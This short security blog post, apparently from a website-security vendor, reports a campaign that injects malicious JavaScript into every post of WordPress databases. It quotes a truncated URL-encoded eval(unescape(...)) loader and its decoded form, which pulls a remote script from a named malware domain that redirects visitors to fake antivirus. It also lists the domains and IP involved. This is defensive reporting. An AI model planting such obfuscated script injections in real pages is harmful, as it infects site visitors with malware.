Database injection, Hilary Kneber and lessthenaminutehandle dot com

We posted a few weeks ago about a database injection attack that infected thousands of WordPress blogs on shared hosts. At that time, the attackers were inserting a javascript link pointing to welcometotheglobalisnet.com/js.php?kk=25 in all the posts in the database.
Today, we started to detect that a large number of those sites are being reinfected (and a bunch of new ones are getting hacked too) with a very similar malware string. The major difference is this time the links are pointing to http://lessthenaminutehandle.com/js.php?kk=33 (both hosted at 91.193.194.110).
This hack also injects the malware on every post in the database, but this time encoded as:

<script>eval(unescape("%64%6F%63%75%6D%65%6E%74%2E%77%72..
70%3F%6B%6B%3D%33%33%22%3E%3C%2F%73%63%72%69%70%74%3E%27%29%3B"..

Which decodes to:

document.write('<script src="http://lessthenaminutehandle.com/js.php?kk=33..

Unfortunately, the domain being used is not blacklisted by Google (or any AV), so the risk is high for every site visitor… If you want to verify your site to ensure it hasn’t been infected, you can scan it here: Sucuri SiteCheck

They are redirected to one of following sites where the infamous Fake AV is pushed to the user…
